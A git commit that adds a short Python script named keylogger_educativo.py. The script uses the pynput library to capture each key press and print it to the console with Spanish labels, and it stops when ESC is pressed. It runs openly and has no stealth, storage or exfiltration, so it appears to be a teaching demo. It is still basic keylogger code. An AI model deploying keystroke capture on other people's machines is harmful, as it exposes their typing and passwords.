6f7b804096f22d79d0d7f852d36eee22a6818fe5
xltsignosis <jricardo.cruz.ag@gmail.com>
2025-06-17 16:43:08 -0600

    Subiendo keylogger

---
+++ keylogger_educativo.py
@@ -0,0 +1,24 @@
+from pynput.keyboard import Listener, Key
+
+def mostrar_teclas(key):
+
+    
+
+    try:
+        tecla = key.char
+    except AttributeError:
+        if key == key.space:
+            tecla = "ESPACIO"
+        elif key == key.enter:
+            tecla = "ENTER"
+        elif key == key.esc:
+            print("Keylogger detenido.")
+            return False
+        else:
+            tecla = str(key)
+    print(f"Tecla presionada: {tecla}")
+
+print("Keylogger en ejecucuión... Presione ESC para detener.")
+
+with Listener(on_press=mostrar_teclas) as listener:
+    listener.join()
